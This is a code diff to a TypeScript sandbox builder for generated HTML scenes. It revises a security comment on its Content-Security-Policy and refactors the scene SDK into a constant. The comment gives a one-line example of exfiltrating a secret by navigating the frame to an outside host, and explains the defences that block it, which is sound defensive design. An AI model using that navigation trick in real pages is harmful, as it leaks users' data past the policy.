@@ -16,9 +16,16 @@
  *   script-src 'unsafe-inline'   inline script only; no remote code, no eval
  *   img-src data: blob:  pixels the host handed over, never a remote URL
  *
- * A scene therefore cannot exfiltrate anything it is shown. Two risks remain and
- * are handled elsewhere rather than here. It can draw something misleading, so
- * the host gives every frame permanent "generated view" chrome and a title —
+ * A scene therefore cannot FETCH anything out: no request it can originate is
+ * allowed to leave. It is not a total seal, and the difference matters —
+ * navigating the frame (`location = "https://elsewhere/?" + secret`) is a
+ * navigation, not a fetch, and nothing in this policy speaks to it. Two doors
+ * close that one, both outside this file: the renderer's own `frame-src`
+ * bounds where a nested context may go, and main refuses a subframe navigation
+ * outside that same allowlist (`will-frame-navigate` in `main.ts`).
+ *
+ * Two further risks remain and are handled elsewhere. It can draw something
+ * misleading, so the host gives every frame permanent "generated view" chrome and a title —
  * a scene must never be mistakable for ADE's own UI. And it can burn CPU: the
  * bounds on that today are the source-size cap below, the clamped frame height,
  * and the fact that a scene stops at the end of its turn on any surface that
@@ -342,9 +349,11 @@ function escapeForScript(value: unknown): string {
  * third-party one would put its licence inside every generated view. The Web
  * Animations API and CSS animations are native to Chromium, cost nothing, and
  * are what models reach for anyway.
+ *
+ * A const rather than a function: it never varies, so building it per scene
+ * only re-trimmed the same four kilobytes.
  */
-function sdkSource(): string {
-  return `
+const SCENE_SDK_SOURCE = `
 (function () {
   var listeners = Object.create(null);
   var reducedMotion = false;
@@ -430,7 +439,6 @@ function sdkSource(): string {
   }
 })();
 `.trim();
-}
 
 function baseStyles(theme: SceneTheme): string {
   return `
@@ -515,7 +523,7 @@ export function buildSceneDocument(args: SceneDocumentArgs): string {
     `window.__ADE_SCENE_DATA__ = ${escapeForScript(args.data ?? null)};`,
     `window.__ADE_SCENE_THEME__ = ${escapeForScript(theme)};`,
     "</script>",
-    `<script>${sdkSource()}</script>`,
+    `<script>${SCENE_SDK_SOURCE}</script>`,
     `</head><body${args.scopeKey ? ` data-scene-scope="${sceneScopeAttribute(args.scopeKey)}"` : ""}>`,
     args.html,
     "</body></html>",
